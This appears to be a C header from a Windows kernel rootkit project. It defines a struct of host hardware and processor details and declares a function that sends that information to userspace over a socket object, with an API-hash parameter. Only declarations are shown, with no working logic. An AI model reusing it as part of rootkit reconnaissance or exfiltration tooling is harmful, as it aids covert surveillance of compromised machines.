#pragma once


typedef struct _ROOTKIT_SYS_INFORMATION
{
	// SYS CONFIGURATION MANAGER

	unsigned long NumberOfDisks;
	unsigned long NumberOfFloppies;
	unsigned long NumberOfCdRoms;
	unsigned long NumberOfSerialPorts;
	unsigned long NumberOfParallelPorts;
	unsigned long TapeDrivesCount;
	unsigned long ScsiCount;

	unsigned short ActiveGroupCount;
	KAFFINITY ActiveProcessors;
	unsigned long ActiveProcessorsCount;
	unsigned long long InterruptTime;
	unsigned long MaximunProcessorCount;

}ROOTKIT_SYS_INFORMATION, *PROOTKIT_SYS_INFORMATION;


NTSTATUS rk_send_sys_information_to_userspace(IN PFILE_OBJECT SocketObject, IN PROOTKIT_API_HASH Hash);